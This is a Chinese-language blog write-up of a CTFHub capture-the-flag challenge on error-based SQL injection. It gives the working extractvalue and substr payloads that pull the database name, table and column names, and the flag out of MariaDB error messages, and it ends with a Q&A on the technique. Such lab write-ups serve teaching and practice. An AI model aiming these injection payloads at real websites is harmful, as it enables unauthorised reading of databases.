---
layout: post
title: CTFHub报错注入Writeup
date: "2026-11-20 20:05:00 +0800"
categories: [CTF, CTFHub, Web]
tags: [ctfhub, web, sql-injection]
---

## 一、题目信息
- **平台**: CTFHub
- **题型**: Web，SQL注入
- **考点**: 报错注入、extractvalue、substr分段读取

## 二、解题思路与踩坑记录

页面只有一个ID输入框，提交后显示两样东西：实际执行的SQL语句，以及“查询正确”或“查询错误”加报错内容。

报错信息是明文显示的，这就决定了思路：不用union回显，直接把查询结果塞进报错信息里，让页面替我们打印出来。

**踩坑一：以为可以直接union**

先试`id=1 union select 1,2`，页面只显示“查询正确”，没有任何数据。说明这个页面不打印查询结果，只打印执行状态。union在这里没用。

**踩坑二：报错有长度限制**

`extractvalue`一次只能带出32个字符。第一次读到`ctfhub{bc02162fe28b87dc0eb6f5c`，少一个字符，flag不完整。

解决办法是用`substr`分段：先取第1到30位，再取第31位往后的部分，两段拼起来。

**踩坑三：数据库是MariaDB**

报错信息里写的是MariaDB，不是MySQL。`extractvalue`和`updatexml`在MariaDB里同样可用，不用换写法。

## 三、解题步骤

1. **判断类型**: 访问`?id=1`，显示查询正确；访问`?id=1'`，报语法错误。说明是字符型注入，但数字型拼接也能用。

2. **读库名**:

```
?id=1 and extractvalue(1,concat(0x7e,(select database())))
```

报错信息出现`XPATH syntax error: '~sqli'`，库名是sqli。0x7e是波浪号，用来做分隔，方便从报错里找。

3. **读表名**:

```
?id=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))
```

返回`~flag,news`，两张表。

4. **读字段名**:

```
?id=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag')))
```

返回`~flag`，字段名就叫flag。

5. **读数据，第一次只拿到半截**:

```
?id=1 and extractvalue(1,concat(0x7e,(select group_concat(flag) from flag)))
```

返回`~ctfhub{bc02162fe28b87dc0eb6f5c`，末尾缺字符。

6. **分段读取**:

```
?id=1 and extractvalue(1,concat(0x7e,(select substr(group_concat(flag),1,30) from flag)))
```

返回前30位。

```
?id=1 and extractvalue(1,concat(0x7e,(select substr(group_concat(flag),31,30) from flag)))
```

返回`~5}`。

两段拼接，完整flag为`ctfhub{bc02162fe28b87dc0eb6f5c5}`。

## 四、总结与反思

1. 报错注入的前提是页面显示报错原文。页面只给“查询正确/错误”四个字，这条思路就不成立。
2. extractvalue和updatexml的原理相同：第二个参数要求是合法的XPath，拼进非法的波浪号就报错，报错内容会带上字符串的求值结果。
3. 报错长度上限32字符，长数据必须分段。substr的第二个参数是起始位置，第三个是长度。
4. group_concat把多行拼成一行，配合substr分段，是读长数据的标准组合。

## 五、问题与解答

**问：为什么不用union。**

答：这个页面不打印查询结果，只打印执行状态和报错。union查出来的数据没有地方显示，所以改用报错把数据带出来。

**问：0x7e是什么，为什么加它。**

答：0x7e是波浪号的十六进制写法。extractvalue的第二个参数必须是合法XPath，前面加波浪号会触发语法错误，同时把后面的求值结果一起带进报错信息，方便定位。

**问：为什么第一次读出来是半截。**

答：报错信息最多显示32个字符，超出部分被截断。用substr分段读取，每段控制在30位以内，再拼接。

**问：extractvalue和updatexml用哪个。**

答：都可以，原理一样。extractvalue两个参数，updatexml三个参数。哪个没被过滤用哪个。

**问：怎么知道库名叫sqli。**

答：报错信息里`XPATH syntax error: '~sqli'`，波浪号后面就是database()的返回值。
